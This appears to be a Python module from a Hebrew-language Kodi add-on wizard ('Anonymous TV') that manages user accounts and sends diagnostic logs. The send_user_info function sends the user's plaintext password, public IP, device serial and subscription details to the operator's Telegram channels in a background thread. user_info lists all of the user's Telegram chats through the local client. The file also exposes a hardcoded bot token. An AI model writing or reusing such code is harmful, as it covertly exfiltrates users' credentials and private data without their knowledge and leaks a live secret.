from builtins import all, any, compile, exec, id, isinstance, len, int, list, map, str, type, Exception, open
exec('')  # אפשר גם לוותר על זה אם לא צריך

import json, os, sys, time, base64, re, logging, subprocess, hashlib, mimetypes, uuid
import xbmcvfs, xbmc, xbmcgui, xbmcaddon
from threading import Thread
from urllib.request import urlopen, Request
from resources.libs import wizard as wiz
from resources.libs import downloader
from resources.libs.wizard import platform_d, user_info_Window
from urllib.parse import quote_plus, quote
import random
import platform

ADDON_ID = wiz.ADDON_ID
ADDON = wiz.addonId(ADDON_ID)
HOME = xbmcvfs.translatePath('special://home/')
ADDONS = os.path.join(HOME, 'addons')
VERSION = wiz.addonInfo(ADDON_ID, 'version')

# ========= הגדרות טלגרם שלך =========
bot = 'bot8494983811:AAH3GmXB3Z4rCFNQaeXoUXl__hFO-H5ntM0'

CHAT_IDS = {
    'howsentlog': '-1003379929881',
    'channel_new_install': '-1003300279214',
    'channel_fast_update': '-1003395962598',
    'channel_install_is_done': '-1003216248373',
    'channel_block_build': '-1003321074760',
}
# ====================================


def get_url(url):
    # try:
    req = Request(url.replace("\n", "%0A"))  # הוספת קידוד לשורה חדשה
    with urlopen(req) as response:
        return json.loads(response.read().decode('utf-8'))
    # except:
    #     return None


def post_file(url, file_path, chat_id):
    boundary = str(uuid.uuid4())
    file_name = os.path.basename(file_path)
    mime_type, _ = mimetypes.guess_type(file_path)
    mime_type = mime_type or 'application/octet-stream'

    with open(file_path, 'rb') as f:
        file_data = f.read()

    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n"
        f"{chat_id}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"document\"; filename=\"{file_name}\"\r\n"
        f"Content-Type: {mime_type}\r\n\r\n"
    ).encode('utf-8') + file_data + f"\r\n--{boundary}--\r\n".encode('utf-8')

    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(body))
    }

    req = Request(url, data=body, headers=headers, method='POST')
    try:
        with urlopen(req) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        return str(e)


def post_json_local(url, json_data):
    data = json.dumps(json_data).encode('utf-8')
    headers = {"Content-Type": "application/json"}
    req = Request(url, data=data, headers=headers, method='POST')
    with urlopen(req) as response:
        return json.loads(response.read().decode('utf-8'))


def send_user_info(mod: str = '', txt: str = ''):
    import shutil

    userr = wiz.getS("user").lower()
    update = wiz.getS("update")
    userdate = wiz.getS("date_user")
    rd = wiz.getS("rd_info")
    tele = wiz.getS("tele_info")
    serialnumber = wiz.getS("device_id")
    device_cunt = wiz.getS("device") or "0"
    device_backup_name = wiz.getS("device_backup_name")
    device_backup = (
        'גיבוי מערכת: פעיל - שם הגיבוי הוא: ' + device_backup_name
        if wiz.getS("device_backup") == 'true'
        else 'גיבוי מערכת: לא פעיל'
    )
    kodiinfo = xbmc.getInfoLabel("System.BuildVersion")[:4]

    chat_id = CHAT_IDS.get(mod, '')
    if not chat_id:
        return

    try:
        local_ip = urlopen("https://api.ipify.org").read().decode("utf-8")
    except Exception:
        local_ip = "can't get ip"

    # חישוב אחסון במכשיר – תואם לכל מערכת עם shutil
    def format_size(size):
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if size < 1024.0:
                return f"{size:.1f} {unit}"
            size /= 1024.0
        return f"{size:.1f} PB"

    try:
        path = xbmcvfs.translatePath('special://home/')
        total, used, free = shutil.disk_usage(path)

        total_str = format_size(total)
        used_str = format_size(used)
        free_str = format_size(free)
        storage_line = (
            "📦 אחסון במכשיר:\n"
            f"• סה\"כ: {total_str}\n"
            f"• תפוס: {used_str}\n"
            f"• פנוי: {free_str}"
        )
    except Exception:
        storage_line = "📦 אחסון במכשיר: לא ניתן לקרוא מידע"

    full_text = (
        txt + '\n' +
        'שם משתמש: #' + userr + '\n' +
        'סיסמה: ' + wiz.getS('password') + '\n' +
        'מנוי: ' + userdate + '\n' +
        'כמות מכשירים: ' + str(device_cunt) + '\n' +
        'קודי: ' + kodiinfo + '\n' +
        'כתובת: ' + local_ip + '\n' +
        'מערכת הפעלה: ' + platform_d() + '\n' +
        serialnumber + '\n' +
        'גירסת ויזארד: ' + VERSION + '\n' +
        device_backup + '\n' + update + '\n' + rd + '\n' + tele + '\n' +
        storage_line
    )

    encoded_text = quote(full_text)
    url = f'https://api.telegram.org/{bot}/sendMessage?chat_id={chat_id}&text={encoded_text}'
    t = Thread(target=get_url, args=(url,))
    t.start()


def logsend():
    wiz.LogNotify("[COLOR gold]Anonymous TV[/COLOR]", "[COLOR white]שולח לוג אנא המתן[/COLOR]", 1500)
    xbmc.executebuiltin('ActivateWindow(busydialognocancel)')

    # שולח גם את פרטי המשתמש לפני הלוג
    send_user_info('channel_install_is_done', 'שלח לוג - לפני התקנה חדשה')

    log_path = xbmcvfs.translatePath('special://logpath/kodi.log')
    old_log_path = xbmcvfs.translatePath('special://logpath/kodi.old.log')
    url = f'https://api.telegram.org/{bot}/sendDocument'

    # שולח לוגים לערוץ "channel_install_is_done"
    install_done_chat_id = CHAT_IDS.get('channel_install_is_done', '')

    if install_done_chat_id:
        post_file(url, log_path, install_done_chat_id)
        if os.path.exists(old_log_path):
            post_file(url, old_log_path, install_done_chat_id)

    xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
    wiz.LogNotify("[COLOR gold]Anonymous TV[/COLOR]", "[COLOR white]הלוג נשלח בהצלחה :)[/COLOR]", 1500)


def get_version_update():
    setting_file = os.path.join(ADDONS, 'skin.anonymoustv', 'xml', 'fastupdate_date.xml')
    with open(setting_file, 'r', encoding='utf-8') as file:
        file_data = file.read()
    regex = '<!-- 2 --><label>(.+?)</label>'
    up = re.compile(regex).findall(file_data)[0]
    return up


def load_chats_until_ready(listen_port):
    if wiz.getS('loadChats') == '':
        fail_count = 0
        max_tries = 5

        while fail_count < max_tries:
            num = random.randint(1, 1001)
            data1 = {
                'type': 'td_send',
                'info': json.dumps({
                    '@type': 'loadChats',
                    'limit': '1000',
                    'chat_list': {'@type': 'chatListArchive'},
                    '@extra': num
                })
            }
            event1 = post_json_local(f'http://127.0.0.1:{listen_port}/', data1)

            num = random.randint(1, 1001)
            data2 = {
                'type': 'td_send',
                'info': json.dumps({
                    '@type': 'loadChats',
                    'limit': '1000',
                    'chat_list': {'@type': 'chatListMain'},
                    '@extra': num
                })
            }
            event2 = post_json_local(f'http://127.0.0.1:{listen_port}/', data2)

            if event1.get('@type') == 'error' and event2.get('@type') == 'error':
                fail_count += 1
            else:
                fail_count = 0  # reset on success

            xbmc.sleep(200)

        wiz.setS('loadChats', 'stop')


def user_info():
    xbmc.executebuiltin('ActivateWindow(busydialognocancel)')

    resuaddon = xbmcaddon.Addon('plugin.video.telemedia')
    settingz_addon = xbmcaddon.Addon('plugin.program.Settingz-Anon')

    backup_name = settingz_addon.getSetting('user_name')
    device_cunt = 'כמות מכשירים מותרת: ' + wiz.getS("device") or "0"
    listen_port = resuaddon.getSetting('port')
    user = wiz.getS("user")
    serialnumber = 'מכשיר רשום במערכת: ' + wiz.getS("device_id")

    try:
        num = random.randint(1, 1001)
        data = {
            'type': 'td_send',
            'info': json.dumps({
                '@type': 'getOption',
                'name': 'my_id',
                '@extra': num
            })
        }
        event2 = post_json_local(f'http://127.0.0.1:{listen_port}/', data)
        my_id = event2.get('value', '')

        if not my_id:
            raise Exception("No TDLib ID returned")

        # טוען צ'אטים אם צריך
        load_chats_until_ready(listen_port)

        data = {'type': 'getallchats', 'info': ''}
        event = post_json_local(f'http://127.0.0.1:{listen_port}/', data)

        status = event.get('status', {})
        if not status:
            # אין תוצאה – מאפסים את הדגל כדי לטעון מחדש בפעם הבאה
            wiz.setS('loadChats', '')
            load_chats_until_ready(listen_port)

            data = {'type': 'getallchats', 'info': ''}
            event = post_json_local(f'http://127.0.0.1:{listen_port}/', data)
            status = event.get('status', {})

        # חילוץ כל ה־chat_ids כרשימת מחרוזות
        if isinstance(status, dict):
            chats = list(map(str, status.keys()))
        else:
            chats = []

        # כאן נכנסת רשימת קבוצות ה־VIP שלך
        VIP_GROUPS = [
            "-1002086580511",
            "-1002208693954",
            "-1002410380591",
            "-1002125588585",
            "-1002431649557",
            "-1002379042612",
            "-1001648442555",
            "-1002163845411"
        ]

        vip_connected = any(chat_id in chats for chat_id in VIP_GROUPS)
        vip_status = "מחובר לקבוצות VIP" if vip_connected else "לא מחובר לקבוצות VIP"

        tele = (
            f'חשבון טלמדיה: פעיל - '
            f'{len([c for c in chats if c.startswith("-100")])} קבוצות בחשבון + {vip_status}'
        )
        wiz.setS("tele_on", 'true')

    except Exception:
        tele = 'חשבון טלמדיה: אינו פעיל'
        wiz.setS("tele_on", '')

    userdate = 'תקופת המנוי תסתיים בתאריך: ' + wiz.getS("date_user")

    rd = 'שירות Real-Debrid: אינו פעיל'
    if os.path.exists(xbmcvfs.translatePath("special://home/addons/" + 'plugin.video.cobra')):
        cobra = xbmcaddon.Addon('plugin.video.cobra')
        if cobra.getSetting('rd.token'):
            try:
                from resources.libs import details_realdebrid
                ssaa = details_realdebrid.RealDebrid().account_info_to_dialog()
                rd = 'שירות RD: פעיל - ' + str(ssaa).replace(')', '').replace('(', '').replace("'", '')
            except Exception:
                rd = 'שירות Real-Debrid: פעיל'

    update = 'גירסת מערכת: ' + get_version_update()
    username = 'שם משתמש: ' + wiz.getS('user')
    device = 'כמות מכשירים: ' + wiz.getS("device")

    wiz.setS("update", update)
    wiz.setS("tele_info", tele)
    wiz.setS("rd_info", rd)

    if backup_name:
        wiz.setS('device_backup', 'true')
        wiz.setS("device_backup_name", backup_name)
        device_backup = 'גיבוי מערכת: פעיל - ' + ' שם הגיבוי הוא: ' + backup_name
    else:
        device_backup = 'גיבוי מערכת: לא פעיל'

    xbmc.executebuiltin('Dialog.Close(busydialognocancel)')

    # שליחת המידע לטלגרם לערוץ ההתקנה החדשה
    t = Thread(target=send_user_info, args=('channel_new_install', 'לחץ על החשבון שלי',))
    t.start()

    user_info_Window(
        tele,
        update,
        rd,
        userdate,
        username,
        device,
        device_backup,
        serialnumber,
        device_cunt
    )
